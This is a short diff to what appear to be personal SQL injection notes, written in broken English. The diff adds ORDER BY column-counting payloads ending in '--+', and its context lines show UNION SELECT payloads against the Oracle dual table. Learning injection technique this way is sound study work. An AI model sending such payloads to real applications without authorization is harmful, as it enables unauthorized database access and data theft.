@@ -10,3 +10,6 @@
 `' UNION SELECT 'strings1' 'strings2' FROM dual` same result with because `NULL` is not defined data.
 `' UNION SELECT NULL NULL FROM dual`
 A `--` can count and if you use `--+` it possible that it a `Mysql` 
+`' ORDER BY 1--+`
+`' ORDER BY 2--+`
+`' ORDER BY 3--+` <- If not work is because you have only two columns used during query.
